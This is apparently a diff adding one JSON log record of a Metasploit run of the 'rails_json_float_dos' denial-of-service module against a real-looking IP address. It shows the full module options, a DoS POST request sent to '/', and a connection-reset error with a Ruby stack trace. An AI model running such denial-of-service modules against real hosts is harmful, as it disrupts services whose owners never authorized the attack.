@@ -1,0 +1,61 @@
+{"ip":"69.225.207.90","vendor":"http","module":"auxiliary/dos/http/rails_json_float_dos","result":"VERBOSE => false
+RPORT => 80
+SSL => false
+UserAgent => Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+HttpUsername => 
+HttpPassword => 
+DigestAuthIIS => true
+SSLVersion => Auto
+FingerprintCheck => true
+DOMAIN => WORKSTATION
+HttpPartialResponses => false
+HttpTrace => false
+HTTP::uri_encode_mode => hex-normal
+HTTP::uri_full_url => false
+HTTP::pad_method_uri_count => 1
+HTTP::pad_uri_version_count => 1
+HTTP::pad_method_uri_type => space
+HTTP::pad_uri_version_type => space
+HTTP::method_random_valid => false
+HTTP::method_random_invalid => false
+HTTP::method_random_case => false
+HTTP::version_random_valid => false
+HTTP::version_random_invalid => false
+HTTP::uri_dir_self_reference => false
+HTTP::uri_dir_fake_relative => false
+HTTP::uri_use_backslashes => false
+HTTP::pad_fake_headers => false
+HTTP::pad_fake_headers_count => 0
+HTTP::pad_get_params => false
+HTTP::pad_get_params_count => 16
+HTTP::pad_post_params => false
+HTTP::pad_post_params_count => 16
+HTTP::uri_fake_end => false
+HTTP::uri_fake_params_start => false
+HTTP::header_folding => false
+TARGETURI => /
+HTTPVERB => POST
+RHOSTS => 69.225.207.90
+DisablePayloadHandler => True
+[*] Running module against 69.225.207.90
+[*] Using digit pattern of 1218 taken to 125000 places
+[*] Sending DoS HTTP POST request to /
+[-] Auxiliary failed: Errno::ECONNRESET Connection reset by peer
+[-] Call stack:
+[-]   <internal:prelude>:73:in `__read_nonblock'
+[-]   <internal:prelude>:73:in `read_nonblock'
+[-]   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-core-0.1.13/lib/rex/io/stream.rb:72:in `read'
+[-]   /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-core-0.1.13/lib/rex/io/stream.rb:202:in `get_once'
+[-]   /opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:550:in `block in read_response'
+[-]   /opt/metasploit-framework/embedded/lib/ruby/2.6.0/timeout.rb:93:in `block in timeout'
+[-]   /opt/metasploit-framework/embedded/lib/ruby/2.6.0/timeout.rb:33:in `block in catch'
+[-]   /opt/metasploit-framework/embedded/lib/ruby/2.6.0/timeout.rb:33:in `catch'
+[-]   /opt/metasploit-framework/embedded/lib/ruby/2.6.0/timeout.rb:33:in `catch'
+[-]   /opt/metasploit-framework/embedded/lib/ruby/2.6.0/timeout.rb:108:in `timeout'
+[-]   /opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:539:in `read_response'
+[-]   /opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:231:in `_send_recv'
+[-]   /opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:211:in `send_recv'
+[-]   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/http/client.rb:384:in `send_request_cgi'
+[-]   /opt/metasploit-framework/embedded/framework/modules/auxiliary/dos/http/rails_json_float_dos.rb:83:in `run'
+[*] Auxiliary module execution completed
+"}
